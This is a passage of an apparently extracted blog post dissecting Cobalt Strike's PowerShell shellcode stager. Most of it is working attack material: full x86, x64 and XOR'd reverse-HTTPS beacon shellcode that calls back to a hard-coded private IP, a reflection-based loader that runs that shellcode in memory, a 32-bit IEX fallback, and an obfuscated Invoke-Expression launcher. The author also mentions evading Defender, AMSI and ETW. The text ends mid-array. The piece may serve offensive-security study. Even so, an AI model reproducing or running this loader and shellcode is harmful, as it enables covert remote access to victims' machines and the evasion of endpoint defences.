0x00,\n\n```\n\n-----\n\n```\n0x00, 0x53, 0x56, 0x68, 0x12, 0x96, 0x89, 0xe2, 0xff, 0xd5, 0x85, 0xc0, 0x74, 0xc6,\n0x8b, 0x07, 0x01, 0xc3, 0x85, 0xc0, 0x75, 0xe5, 0x58, 0xc3, 0xe8, 0xa9, 0xfd, 0xff,\n0xff, 0x31, 0x39, 0x32, 0x2e, 0x31, 0x36, 0x38, 0x2e, 0x31, 0x30, 0x30, 0x2e, 0x31,\n0x30, 0x33, 0x00, 0x66, 0x6a, 0x58, 0xa9 };\n// x64\nbyte[] buf = new byte[894] { 0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc8, 0x00, 0x00,\n0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b,\n0x52, 0x60, 0x48, 0x8b, 0x52, 0x18, 0x48, 0x8b, 0x52, 0x20, 0x48, 0x8b, 0x72, 0x50,\n0x48, 0x0f, 0xb7, 0x4a, 0x4a, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x3c, 0x61,\n0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0xe2, 0xed, 0x52,\n0x41, 0x51, 0x48, 0x8b, 0x52, 0x20, 0x8b, 0x42, 0x3c, 0x48, 0x01, 0xd0, 0x66, 0x81,\n0x78, 0x18, 0x0b, 0x02, 0x75, 0x72, 0x8b, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48, 0x85,\n0xc0, 0x74, 0x67, 0x48, 0x01, 0xd0, 0x50, 0x8b, 0x48, 0x18, 0x44, 0x8b, 0x40, 0x20,\n0x49, 0x01, 0xd0, 0xe3, 0x56, 0x48, 0xff, 0xc9, 0x41, 0x8b, 0x34, 0x88, 0x48, 0x01,\n0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01,\n0xc1, 0x38, 0xe0, 0x75, 0xf1, 0x4c, 0x03, 0x4c, 0x24, 0x08, 0x45, 0x39, 0xd1, 0x75,\n0xd8, 0x58, 0x44, 0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0, 0x66, 0x41, 0x8b, 0x0c, 0x48,\n0x44, 0x8b, 0x40, 0x1c, 0x49, 0x01, 0xd0, 0x41, 0x8b, 0x04, 0x88, 0x48, 0x01, 0xd0,\n0x41, 0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a, 0x41, 0x58, 0x41, 0x59, 0x41, 0x5a, 0x48,\n0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0, 0x58, 0x41, 0x59, 0x5a, 0x48, 0x8b, 0x12,\n0xe9, 0x4f, 0xff, 0xff, 0xff, 0x5d, 0x6a, 0x00, 0x49, 0xbe, 0x77, 0x69, 0x6e, 0x69,\n0x6e, 0x65, 0x74, 0x00, 0x41, 0x56, 0x49, 0x89, 0xe6, 0x4c, 0x89, 0xf1, 0x41, 0xba,\n0x4c, 0x77, 0x26, 0x07, 0xff, 0xd5, 0x48, 0x31, 0xc9, 0x48, 0x31, 0xd2, 0x4d, 0x31,\n0xc0, 0x4d, 0x31, 0xc9, 0x41, 0x50, 0x41, 0x50, 0x41, 0xba, 0x3a, 0x56, 0x79, 0xa7,\n0xff, 0xd5, 0xeb, 0x73, 0x5a, 0x48, 0x89, 0xc1, 0x41, 0xb8, 0xbb, 0x01, 0x00, 0x00,\n0x4d, 0x31, 0xc9, 0x41, 0x51, 0x41, 0x51, 0x6a, 0x03, 0x41, 0x51, 0x41, 0xba, 0x57,\n0x89, 0x9f, 0xc6, 0xff, 0xd5, 0xeb, 0x59, 0x5b, 0x48, 0x89, 0xc1, 0x48, 0x31, 0xd2,\n0x49, 0x89, 0xd8, 0x4d, 0x31, 0xc9, 0x52, 0x68, 0x00, 0x02, 0x40, 0x84, 0x52, 0x52,\n0x41, 0xba, 0xeb, 0x55, 0x2e, 0x3b, 0xff, 0xd5, 0x48, 0x89, 0xc6, 0x48, 0x83, 0xc3,\n0x50, 0x6a, 0x0a, 0x5f, 0x48, 0x89, 0xf1, 0x48, 0x89, 0xda, 0x49, 0xc7, 0xc0, 0xff,\n0xff, 0xff, 0xff, 0x4d, 0x31, 0xc9, 0x52, 0x52, 0x41, 0xba, 0x2d, 0x06, 0x18, 0x7b,\n0xff, 0xd5, 0x85, 0xc0, 0x0f, 0x85, 0x9d, 0x01, 0x00, 0x00, 0x48, 0xff, 0xcf, 0x0f,\n0x84, 0x8c, 0x01, 0x00, 0x00, 0xeb, 0xd3, 0xe9, 0xe4, 0x01, 0x00, 0x00, 0xe8, 0xa2,\n0xff, 0xff, 0xff, 0x2f, 0x43, 0x6b, 0x4d, 0x62, 0x00, 0xa7, 0x81, 0x5a, 0x46, 0x7a,\n0xec, 0xdb, 0xa7, 0xc3, 0x70, 0x68, 0xd8, 0x48, 0x21, 0x03, 0x07, 0x8f, 0x6c, 0x69,\n0xc3, 0xd1, 0xc1, 0x8e, 0x2e, 0x5c, 0xfd, 0xbf, 0x3d, 0x8d, 0x1f, 0xcc, 0xaf, 0x07,\n0x9a, 0xd8, 0x6c, 0x8d, 0x05, 0xb0, 0xd4, 0xaa, 0x58, 0x3a, 0xa6, 0x9d, 0x96, 0xde,\n0x4d, 0xcf, 0x71, 0x30, 0x20, 0x03, 0x33, 0x34, 0x2f, 0x12, 0xae, 0xa2, 0x29, 0x04,\n0x0c, 0x20, 0x31, 0x5e, 0xd9, 0x03, 0xc8, 0xe8, 0xee, 0xdb, 0x10, 0xa5, 0x00, 0x55,\n0x73, 0x65, 0x72, 0x2d, 0x41, 0x67, 0x65, 0x6e, 0x74, 0x3a, 0x20, 0x4d, 0x6f, 0x7a,\n0x69, 0x6c, 0x6c, 0x61, 0x2f, 0x35, 0x2e, 0x30, 0x20, 0x28, 0x63, 0x6f, 0x6d, 0x70,\n0x61, 0x74, 0x69, 0x62, 0x6c, 0x65, 0x3b, 0x20, 0x4d, 0x53, 0x49, 0x45, 0x20, 0x31,\n0x30, 0x2e, 0x30, 0x3b, 0x20, 0x57, 0x69, 0x6e, 0x64, 0x6f, 0x77, 0x73, 0x20, 0x4e,\n0x54, 0x20, 0x36, 0x2e, 0x32, 0x3b, 0x20, 0x57, 0x4f, 0x57, 0x36, 0x34, 0x3b, 0x20,\n0x54, 0x72, 0x69, 0x64, 0x65, 0x6e, 0x74, 0x2f, 0x36, 0x2e, 0x30, 0x3b, 0x20, 0x4d,\n0x41, 0x41, 0x52, 0x4a, 0x53, 0x29, 0x0d, 0x0a, 0x00, 0xd8, 0xdf, 0x0e, 0x86, 0xaf,\n0x8b, 0xcc, 0x3a, 0x46, 0x57, 0x4a, 0x8a, 0x0a, 0x77, 0x2b, 0xfa, 0x21, 0xcb, 0x1a,\n0x91, 0xe3, 0x91, 0xf3, 0xbb, 0x14, 0xcc, 0xb0, 0x1f, 0xa3, 0xfd, 0xd1, 0x99, 0x81,\n0xa8, 0xb1, 0xfd, 0x24, 0x17, 0x9f, 0xfc, 0x09, 0xd9, 0x23, 0xc9, 0x44, 0x41, 0x9a,\n0x71, 0x7b, 0x0a, 0xfa, 0x34, 0x6a, 0xb2, 0xc6, 0xf9, 0xeb, 0x28, 0xf4, 0x5e, 0x61,\n0x58, 0x90, 0xdc, 0x55, 0x83, 0xe4, 0xbf, 0xdc, 0x26, 0x51, 0xb3, 0xb1, 0x28, 0x42,\n0x72, 0xf5, 0x8b, 0x9f, 0xaf, 0xe3, 0x9b, 0x7e, 0x3f, 0x27, 0xa3, 0x02, 0xcd, 0x99,\n0xb7, 0x19, 0x7a, 0x95, 0xc2, 0xe1, 0xcc, 0xe8, 0x65, 0x17, 0xbc, 0x63, 0xfe, 0xd8,\n0x64, 0xb1, 0x2d, 0xe2, 0xa5, 0x03, 0x91, 0xb7, 0x2c, 0x98, 0xc4, 0x7e, 0xab, 0x7d,\n\n```\n\n-----\n\n```\n0x92, 0x6b, 0xcc, 0x5a, 0x36, 0x27, 0x06, 0xcd, 0x68, 0x43, 0xe5, 0x9c, 0x79, 0x16,\n0x0c, 0x2a, 0xa5, 0x51, 0x95, 0xb7, 0x75, 0x4f, 0x47, 0x03, 0x06, 0x85, 0xe8, 0x6d,\n0xdc, 0x5a, 0x31, 0x0d, 0x40, 0xfa, 0x42, 0x77, 0x06, 0x35, 0x5b, 0xc7, 0xfa, 0x51,\n0xa0, 0x0e, 0x97, 0xc2, 0x6c, 0x6f, 0x07, 0xb1, 0xd1, 0x84, 0x95, 0x54, 0x8a, 0x97,\n0x09, 0xa8, 0xe9, 0xc1, 0x74, 0x7a, 0xd2, 0xd9, 0x53, 0x59, 0x4c, 0x5d, 0xf5, 0xc1,\n0x98, 0x4a, 0x7d, 0xe8, 0xed, 0x92, 0xf3, 0xf2, 0xa8, 0x38, 0x49, 0x90, 0x2d, 0x5d,\n0x99, 0x7a, 0x2d, 0x59, 0x8d, 0xa6, 0x78, 0x00, 0x00, 0x41, 0xbe, 0xf0, 0xb5, 0xa2,\n0x56, 0xff, 0xd5, 0x48, 0x31, 0xc9, 0xba, 0x00, 0x00, 0x40, 0x00, 0x41, 0xb8, 0x00,\n0x10, 0x00, 0x00, 0x41, 0xb9, 0x40, 0x00, 0x00, 0x00, 0x41, 0xba, 0x58, 0xa4, 0x53,\n0xe5, 0xff, 0xd5, 0x48, 0x93, 0x53, 0x53, 0x48, 0x89, 0xe7, 0x48, 0x89, 0xf1, 0x48,\n0x89, 0xda, 0x41, 0xb8, 0x00, 0x20, 0x00, 0x00, 0x49, 0x89, 0xf9, 0x41, 0xba, 0x12,\n0x96, 0x89, 0xe2, 0xff, 0xd5, 0x48, 0x83, 0xc4, 0x20, 0x85, 0xc0, 0x74, 0xb6, 0x66,\n0x8b, 0x07, 0x48, 0x01, 0xc3, 0x85, 0xc0, 0x75, 0xd7, 0x58, 0x58, 0x58, 0x48, 0x05,\n0x00, 0x00, 0x00, 0x00, 0x50, 0xc3, 0xe8, 0x9f, 0xfd, 0xff, 0xff, 0x31, 0x39, 0x32,\n0x2e, 0x31, 0x36, 0x38, 0x2e, 0x31, 0x30, 0x30, 0x2e, 0x31, 0x30, 0x33, 0x00, 0x66,\n0x6a, 0x58, 0xa9 };\n// XOR'd\nbyte[] buf = new byte[800] { 0xfc, 0xe8, 0x89, 0x0, 0x0, 0x0, 0x60, 0x89, 0xe5, 0x31,\n0xd2, 0x64, 0x8b, 0x52, 0x30, 0x8b, 0x52, 0xc, 0x8b, 0x52, 0x14, 0x8b, 0x72, 0x28,\n0xf, 0xb7, 0x4a, 0x26, 0x31, 0xff, 0x31, 0xc0, 0xac, 0x3c, 0x61, 0x7c, 0x2, 0x2c,\n0x20, 0xc1, 0xcf, 0xd, 0x1, 0xc7, 0xe2, 0xf0, 0x52, 0x57, 0x8b, 0x52, 0x10, 0x8b,\n0x42, 0x3c, 0x1, 0xd0, 0x8b, 0x40, 0x78, 0x85, 0xc0, 0x74, 0x4a, 0x1, 0xd0, 0x50,\n0x8b, 0x48, 0x18, 0x8b, 0x58, 0x20, 0x1, 0xd3, 0xe3, 0x3c, 0x49, 0x8b, 0x34, 0x8b,\n0x1, 0xd6, 0x31, 0xff, 0x31, 0xc0, 0xac, 0xc1, 0xcf, 0xd, 0x1, 0xc7, 0x38, 0xe0,\n0x75, 0xf4, 0x3, 0x7d, 0xf8, 0x3b, 0x7d, 0x24, 0x75, 0xe2, 0x58, 0x8b, 0x58, 0x24,\n0x1, 0xd3, 0x66, 0x8b, 0xc, 0x4b, 0x8b, 0x58, 0x1c, 0x1, 0xd3, 0x8b, 0x4, 0x8b, 0x1,\n0xd0, 0x89, 0x44, 0x24, 0x24, 0x5b, 0x5b, 0x61, 0x59, 0x5a, 0x51, 0xff, 0xe0, 0x58,\n0x5f, 0x5a, 0x8b, 0x12, 0xeb, 0x86, 0x5d, 0x68, 0x6e, 0x65, 0x74, 0x0, 0x68, 0x77,\n0x69, 0x6e, 0x69, 0x54, 0x68, 0x4c, 0x77, 0x26, 0x7, 0xff, 0xd5, 0x31, 0xff, 0x57,\n0x57, 0x57, 0x57, 0x57, 0x68, 0x3a, 0x56, 0x79, 0xa7, 0xff, 0xd5, 0xe9, 0x84, 0x0,\n0x0, 0x0, 0x5b, 0x31, 0xc9, 0x51, 0x51, 0x6a, 0x3, 0x51, 0x51, 0x68, 0xbb, 0x1, 0x0,\n0x0, 0x53, 0x50, 0x68, 0x57, 0x89, 0x9f, 0xc6, 0xff, 0xd5, 0xeb, 0x70, 0x5b, 0x31,\n0xd2, 0x52, 0x68, 0x0, 0x2, 0x40, 0x84, 0x52, 0x52, 0x52, 0x53, 0x52, 0x50, 0x68,\n0xeb, 0x55, 0x2e, 0x3b, 0xff, 0xd5, 0x89, 0xc6, 0x83, 0xc3, 0x50, 0x31, 0xff, 0x57,\n0x57, 0x6a, 0xff, 0x53, 0x56, 0x68, 0x2d, 0x6, 0x18, 0x7b, 0xff, 0xd5, 0x85, 0xc0,\n0xf, 0x84, 0xc3, 0x1, 0x0, 0x0, 0x31, 0xff, 0x85, 0xf6, 0x74, 0x4, 0x89, 0xf9, 0xeb,\n0x9, 0x68, 0xaa, 0xc5, 0xe2, 0x5d, 0xff, 0xd5, 0x89, 0xc1, 0x68, 0x45, 0x21, 0x5e,\n0x31, 0xff, 0xd5, 0x31, 0xff, 0x57, 0x6a, 0x7, 0x51, 0x56, 0x50, 0x68, 0xb7, 0x57,\n0xe0, 0xb, 0xff, 0xd5, 0xbf, 0x0, 0x2f, 0x0, 0x0, 0x39, 0xc7, 0x74, 0xb7, 0x31, 0xff,\n0xe9, 0x91, 0x1, 0x0, 0x0, 0xe9, 0xc9, 0x1, 0x0, 0x0, 0xe8, 0x8b, 0xff, 0xff, 0xff,\n0x2f, 0x49, 0x47, 0x7a, 0x52, 0x0, 0x35, 0xea, 0xc1, 0x38, 0x3b, 0x2e, 0x33, 0x80,\n0x32, 0x3e, 0x60, 0x48, 0x90, 0x8d, 0x3b, 0xa8, 0x4a, 0x41, 0x41, 0x62, 0x31, 0x3f,\n0x12, 0xda, 0x8d, 0x5f, 0x43, 0xce, 0xa2, 0x30, 0xea, 0x90, 0x6, 0x5, 0x82, 0xf9,\n0xf3, 0xa0, 0x84, 0xe, 0x83, 0x8e, 0xe6, 0xba, 0x72, 0x47, 0xd9, 0x23, 0x96, 0x1e,\n0x43, 0xf6, 0x9a, 0x76, 0x5b, 0x10, 0x8b, 0xfb, 0x8e, 0xe, 0xdd, 0x5c, 0x38, 0x6e,\n0x49, 0x7b, 0xf0, 0xcd, 0xe5, 0x73, 0xf9, 0x5d, 0xe9, 0x0, 0x55, 0x73, 0x65, 0x72,\n0x2d, 0x41, 0x67, 0x65, 0x6e, 0x74, 0x3a, 0x20, 0x4d, 0x6f, 0x7a, 0x69, 0x6c, 0x6c,\n0x61, 0x2f, 0x35, 0x2e, 0x30, 0x20, 0x28, 0x63, 0x6f, 0x6d, 0x70, 0x61, 0x74, 0x69,\n0x62, 0x6c, 0x65, 0x3b, 0x20, 0x4d, 0x53, 0x49, 0x45, 0x20, 0x39, 0x2e, 0x30, 0x3b,\n0x20, 0x57, 0x69, 0x6e, 0x64, 0x6f, 0x77, 0x73, 0x20, 0x4e, 0x54, 0x20, 0x36, 0x2e,\n0x31, 0x3b, 0x20, 0x54, 0x72, 0x69, 0x64, 0x65, 0x6e, 0x74, 0x2f, 0x35, 0x2e, 0x30,\n0x3b, 0x20, 0x46, 0x75, 0x6e, 0x57, 0x65, 0x62, 0x50, 0x72, 0x6f, 0x64, 0x75, 0x63,\n0x74, 0x73, 0x3b, 0x20, 0x49, 0x45, 0x30, 0x30, 0x30, 0x36, 0x5f, 0x76, 0x65, 0x72,\n0x31, 0x3b, 0x45, 0x4e, 0x5f, 0x47, 0x42, 0x29, 0xd, 0xa, 0x0, 0x33, 0x4c, 0x35,\n\n```\n\n-----\n\n```\n0x6c, 0x6a, 0x72, 0x64, 0xf3, 0x8f, 0xb1, 0x2f, 0xae, 0x8c, 0x47, 0x1b, 0x7b, 0x1c,\n0x66, 0xd1, 0x8c, 0x98, 0xc0, 0xd6, 0x2d, 0xe5, 0xda, 0x46, 0x72, 0x15, 0xc9, 0x3d,\n0x21, 0xda, 0xf7, 0x7e, 0x8f, 0x14, 0x0, 0xe0, 0x62, 0xca, 0x3, 0xfb, 0x5e, 0xbe,\n0x3, 0x61, 0x59, 0xaf, 0x78, 0xd4, 0xbb, 0xcb, 0xda, 0xc0, 0x22, 0x43, 0x8d, 0x86,\n0xd4, 0x57, 0x21, 0xc2, 0x7e, 0x5d, 0x9, 0xb6, 0x62, 0x3b, 0x2a, 0x4e, 0xe, 0x32,\n0xe9, 0x6e, 0x6a, 0xd3, 0xb6, 0x38, 0x99, 0x2, 0xc8, 0x2c, 0x89, 0x55, 0xa1, 0xa3,\n0xcd, 0x7b, 0x64, 0x6d, 0xb9, 0x1f, 0xce, 0x77, 0x2a, 0x7e, 0x56, 0x5d, 0x70, 0xbc,\n0xd0, 0x6f, 0x91, 0x4a, 0xc6, 0xe3, 0x15, 0x24, 0x7f, 0x65, 0x7a, 0xea, 0x5d, 0xad,\n0x55, 0x6d, 0x69, 0xc2, 0x10, 0x35, 0x81, 0x87, 0xb5, 0x49, 0x17, 0x60, 0xcc, 0xf6,\n0xcd, 0x29, 0x5f, 0x9a, 0x33, 0xce, 0x98, 0x7c, 0xbb, 0x7f, 0xad, 0xaa, 0xbb, 0xf7,\n0x46, 0x66, 0xe6, 0xf, 0x4d, 0x21, 0xc2, 0x2a, 0xfc, 0x52, 0x43, 0xd7, 0xf2, 0x7c,\n0xcb, 0xc6, 0x26, 0xc2, 0xd7, 0x61, 0x86, 0x3, 0xad, 0x48, 0xa4, 0x32, 0x87, 0xb4,\n0x19, 0xb5, 0x1f, 0x28, 0x7a, 0xc5, 0x7e, 0x8d, 0x7b, 0xa5, 0x9a, 0xa, 0xc7, 0x74,\n0x52, 0x78, 0xce, 0x1f, 0x36, 0x0, 0x68, 0xf0, 0xb5, 0xa2, 0x56, 0xff, 0xd5, 0x6a,\n0x40, 0x68, 0x0, 0x10, 0x0, 0x0, 0x68, 0x0, 0x0, 0x40, 0x0, 0x57, 0x68, 0x58, 0xa4,\n0x53, 0xe5, 0xff, 0xd5, 0x93, 0xb9, 0x0, 0x0, 0x0, 0x0, 0x1, 0xd9, 0x51, 0x53, 0x89,\n0xe7, 0x57, 0x68, 0x0, 0x20, 0x0, 0x0, 0x53, 0x56, 0x68, 0x12, 0x96, 0x89, 0xe2,\n0xff, 0xd5, 0x85, 0xc0, 0x74, 0xc6, 0x8b, 0x7, 0x1, 0xc3, 0x85, 0xc0, 0x75, 0xe5,\n0x58, 0xc3, 0xe8, 0xa9, 0xfd, 0xff, 0xff, 0x31, 0x39, 0x32, 0x2e, 0x31, 0x36, 0x38,\n0x2e, 0x31, 0x30, 0x30, 0x2e, 0x31, 0x30, 0x33, 0x0, 0x66, 0x6a, 0x58, 0xa9 };\n\n### After defining the shellcode as the x86 output, the details of x86 will be discussed later on, the invoke for VirtualAlloc will look like this:\n$buffer = $virtualAlloc.Invoke([IntPtr]::Zero, $shellcode.Length, 0x3000, 0x40)\n\n The Copy() call is the same as it always is. The only thing I would change here is the variable names.\n[System.Runtime.InteropServices.Marshal]::Copy($var_code, 0, $var_buffer,\n$var_code.length)\n\n The final bit of spooky code from Cobalt Strike:\n$var_runme =\n[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($var_buffer,\n(func_get_delegate_type @([IntPtr]) ([Void])))\n\n Using the GetDelegateForFunctionPointer, the buffer created by VirtualAlloc is passed in. I updated the code to look like this for my own understanding:\n$bufferAssembly = (CreateDynamicAssemblyType @([IntPtr]) ([Void]))\n$bufferDelegate =\n[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($buffer,\n$bufferAssembly)\n\n This is the final step, the actual Invoke on the delegate can take place:\n$var_runme.Invoke([IntPtr]::Zero)\n\n That's a run through of how Cobalt Strike uses PowerShell to execute shellcode. But there is one downside that I jumped over earlier. The architecture.\n\n```\n\n-----\n\n### If this is executed in a x86 PowerShell process, its totally fine. However, if this is ran in a\n```\nx64 process, it will die very ugracefully:\nUnhandled Exception: System.Runtime.InteropServices.SEHException: External component\nhas thrown an exception.\n  at CallSite.Target(Closure, CallSite, Object, IntPtr )\n  at System.Dynamic.UpdateDelegates.UpdateAndExecute2[T0,T1,TRet](CallSite site, T0\narg0, T1 arg1)\n  at\nSystem.Management.Automation.Interpreter.DynamicInstruction`3.Run(InterpretedFrame\nframe)\n  at\nSystem.Management.Automation.Interpreter.EnterTryCatchFinallyInstruction.Run(Interpret\n frame)\n  at\nSystem.Management.Automation.Interpreter.EnterTryCatchFinallyInstruction.Run(Interpret\n frame)\n  at System.Management.Automation.Interpreter.Interpreter.Run(InterpretedFrame\nframe)\n  at System.Management.Automation.Interpreter.LightLambda.RunVoid1[T0](T0 arg0)\n  at System.Management.Automation.DlrScriptCommandProcessor.RunClause(Action`1\nclause, Object dollarUnderbar, Object inputToProcess)\n  at System.Management.Automation.DlrScriptCommandProcessor.Complete()\n  at System.Management.Automation.CommandProcessorBase.DoComplete()\n  at\nSystem.Management.Automation.Internal.PipelineProcessor.DoCompleteCore(CommandProcesso\n commandRequestingUpstreamCommandsToStop)\n  at\nSystem.Management.Automation.Internal.PipelineProcessor.SynchronousExecuteEnumerate(Ob\n input)\n  at System.Management.Automation.Runspaces.LocalPipeline.InvokeHelper()\n  at System.Management.Automation.Runspaces.LocalPipeline.InvokeThreadProc()\n  at System.Management.Automation.Runspaces.PipelineThread.WorkerProc()\n  at System.Threading.ExecutionContext.RunInternal(ExecutionContext\nexecutionContext, ContextCallback callback, Object state, Boolean preserveSyncCtx)\n  at System.Threading.ExecutionContext.Run(ExecutionContext executionContext,\nContextCallback callback, Object state, Boolean preserveSyncCtx)\n  at System.Threading.ExecutionContext.Run(ExecutionContext executionContext,\nContextCallback callback, Object state)\n  at System.Threading.ThreadHelper.ThreadStart()\n\n I couldn't find a direct and specific cause for this, but as Raffi identified, it has to be executed in a x86 context regardless of the process architecture.\n\n The solution from Cobalt Strike:\nIf ([IntPtr]::size -eq 8) {\n  start-job { param($a) IEX $a } -RunAs32 -Argument $DoIt | wait-job | Receive-Job\n}\nelse {\n  IEX $DoIt\n}\n\n By doing this it guarantees that the execution is done in an x86 context\n\n```\n\n-----\n\n### Whilst debugging, I ended up using a different If :\n```\nif([Environment]::Is64BitProcess){\n  Write-Host \"x64!\"\n  Write-Host \"Using Start-Job\"\n  start-job { param($a) IEX $a } -RunAs32 -Argument $x | wait-job | Receive-Job\n}\nelse{\n  Write-Host \"x86!\"\n  Write-Host \"Using Invoke-Expression\"\n  Invoke-Expression $x\n}\n\n The Is64BitProcess call made it easier to read during testing. However, the size of the\nIntPtr is more reliable due to the Boolean check being introduced in .NET 4.0.\n\n The beacons:\n\n x64 and x86 execution\n\n The beacons above are launched from both an x86 and x64 process. But the if statement at the end ensures it always runs as x86 due to the aforementioned error. This is the part which I couldn't get working, I couldn't get an x64 beacon to work without it dying. If anyone knows the solution for this, please let me know via Twitter. But either way, this is how Cobalt Strike implements it.\n\n At this point, loads of stuff can be done such as amsi.fail, patching ETW or even use Invoke- Obfuscation to obfuscate the execution:\nIf ([IntPtr]::size -eq 8) {\n  inVOKE-eXPRESsIOn(New-oBJeCT IO.CoMpREssIoN.DefLatESTREaM(\n[sYSTEM.IO.mEMOrYstrEam][cOnvErt]::frOMBaSE64STrinG(\n'Ky5JLCrRzcpPUqhWKEgsSszVUEnUVPB0jVBQSVSoVdANKs1zLDY2UtB1LEovzU3NK1FQqVCoUShPzIToqlEIS\n, [sYSteM.iO.cOMpREsSiOn.COmpRESsIoNMode]::deCOMpRess)|foREacH-oBjecT{New-oBJeCT\niO.StREAmreader( $_,[SysteM.teXT.ENcODIng]::AsciI)} ).ReADtoeNd()\n}\nelse{\n  (nEW-oBjECT sYsTem.Io.streAMrEAder((nEW-oBjECT IO.cOMPResSIOn.DEfLaTestreaM(\n[iO.MEmoRYSTReaM][CONVert]::FroMBASe64StRINg( '88wry89O1XWtKChKLS7OzM9TUKkAAA==' ),\n[SystEM.iO.COmprESsIon.CoMPREsSIOnModE]::DECompresS)),\n[teXT.enCODinG]::ASCii)).reAdToEnd() |& ((gv '*MDr*').name[3,11,2]-joIn'')\n}\n\n## Conclusion\n\n### The purpose of this was to get an understanding of cooler ways to execute shellcode in PowerShell that don't rely on add-type and leave out the C# implementations like:\n\n```\n\n-----\n\n```\nAdd Type TypeDefinition @ \nusing System;\nusing System.Diagnostics;\nusing System.Runtime.InteropServices;\npublic static class WinAPI\n{\n  [DllImport(\"kernel32\")]\n  public static extern UInt32 VirtualAlloc(UInt32 lpStartAddr,UInt32 size, UInt32\nflAllocationType, UInt32 flProtect);\n  [DllImport(\"kernel32\")]\n  public static extern IntPtr CreateThread(UInt32 lpThreadAttributes,UInt32\ndwStackSize,UInt32 lpStartAddress,IntPtr param,UInt32 dwCreationFlags,ref UInt32\nlpThreadId);\n  [DllImport(\"kernel32\")]\n  public static extern bool CloseHandle(IntPtr handle);\n  [DllImport(\"kernel32\")]\n  public static extern UInt32 WaitForSingleObject(IntPtr hHandle,UInt32\ndwMilliseconds);\n}\n\"@\n\n### The implementation from Cobalt Strike uses a lot of Matt Graeber's research in his Accessing the Windows API in PowerShell via internal .NET methods and reflection blog. There is a lot of room for expansion with this implementation and it does get caught by Defender, but I dealt with this pretty easily by XOR'ing the strings and shellcode. The only thing I couldn't figure out during this exploration was why (or how to) get this working with\nx64 . This implementation ensures that the code is executed in an x86 context. If you\n\n know how to get this working for x64, let me know on Twitter!\n\n The full code:\n\n```\n\n-----\n\n```\n$x @ \n  function GetPtrToMethod(){\n  Param ($dllName, $methodName)\n  $SystemDLL = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object {\n$_.GlobalAssemblyCache -And $_.Location.Split('\\\\')[-1].Equals('System.dll') })\n  $UnsafeMethods = $SystemDLL.GetType('Microsoft.Win32.UnsafeNativeMethods')\n  $procAddress = $UnsafeMethods.GetMethod('GetProcAddress', [Type[]]\n@('System.Runtime.InteropServices.HandleRef', 'string'))\n  $getModuleHandle = $UnsafeMethods.GetMethod('GetModuleHandle')\n  $dllHandle = $getModuleHandle.Invoke($null, @($dllName))\n  $params = @([System.Runtime.InteropServices.HandleRef](New-Object\nSystem.Runtime.InteropServices.HandleRef((New-Object IntPtr), $dllHandle)),\n$methodName)\n  return $procAddress.Invoke($null, $params)\n}\nfunction CreateDynamicAssemblyType {\n  Param (\n    [Parameter(Position = 0, Mandatory = $True)] [Type[]] $parameterTypes,\n    [Parameter(Position = 1)] [Type] $returnType = [Void]\n  )\n  $dynamicAssembly = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object\nSystem.Reflection.AssemblyName('ReflectedDelegate')),\n[System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModu\n $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass',\n[System.MulticastDelegate])\n  $dynamicAssembly.DefineConstructor('RTSpecialName, HideBySig, Public',\n[System.Reflection.CallingConventions]::Standard,\n$parameterTypes).SetImplementationFlags('Runtime, Managed')\n  $dynamicAssembly.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual',\n$returnType, $parameterTypes).SetImplementationFlags('Runtime, Managed')\n  return $dynamicAssembly.CreateType()\n}\n[Byte[]]$shellcode = 0xfc, 0xe8, 0x89, 0x0, 0x0, 0x0, 0x60, 0x89, 0xe5, 0x31, 0xd2,\n0x64, 0x8b, 0x52, 0x30, 0x8b, 0x52, 0xc, 0x8b, 0x52, 0x14, 0x8b, 0x72, 0x28, 0xf,\n0xb7, 0x4a, 0x26, 0x31, 0xff, 0x31, 0xc0, 0xac, 0x3c, 0x61, 0x7c, 0x2, 0x2c, 0x20,\n0xc1, 0xcf, 0xd, 0x1, 0xc7, 0xe2, 0xf0, 0x52, 0x57, 0x8b, 0x52, 0x10, 0x8b, 0x42,\n0x3c, 0x1, 0xd0, 0x8b, 0x40, 0x78, 0x85, 0xc0, 0x74, 0x4a, 0x1, 0xd0, 0x50, 0x8b,\n0x48, 0x18, 0x8b, 0x58, 0x20, 0x1, 0xd3, 0xe3, 0x3c, 0x49, 0x8b, 0x34, 0x8b, 0x1,\n0xd6, 0x31, 0xff, 0x31, 0xc0, 0xac, 0xc1, 0xcf, 0xd, 0x1, 0xc7, 0x38, 0xe0, 0x75,\n0xf4, 0x3, 0x7d, 0xf8, 0x3b, 0x7d, 0x24, 0x75, 0xe2, 0x58, 0x8b, 0x58, 0x24, 0x1,\n0xd3, 0x66, 0x8b, 0xc, 0x4b, 0x8b, 0x58, 0x1c, 0x1, 0xd3, 0x8b, 0x4, 0x8b, 0x1, 0xd0,\n0x89, 0x44, 0x24, 0x24, 0x5b, 0x5b, 0x61, 0x59, 0x5a, 0x51, 0xff, 0xe0, 0x58, 0x5f,\n0x5a, 0x8b, 0x12, 0xeb, 0x86, 0x5d, 0x68, 0x6e, 0x65, 0x74, 0x0, 0x68, 0x77, 0x69,\n0x6e, 0x69, 0x54, 0x68, 0x4c, 0x77, 0x26, 0x7, 0xff, 0xd5, 0x31, 0xff, 0x57, 0x57,\n0x57, 0x57, 0x57, 0x68, 0x3a, 0x56, 0x79, 0xa7, 0xff, 0xd5, 0xe9, 0x84, 0x0, 0x0,\n0x0, 0x5b, 0x31, 0xc9, 0x51, 0x51, 0x6a, 0x3, 0x51, 0x51, 0x68, 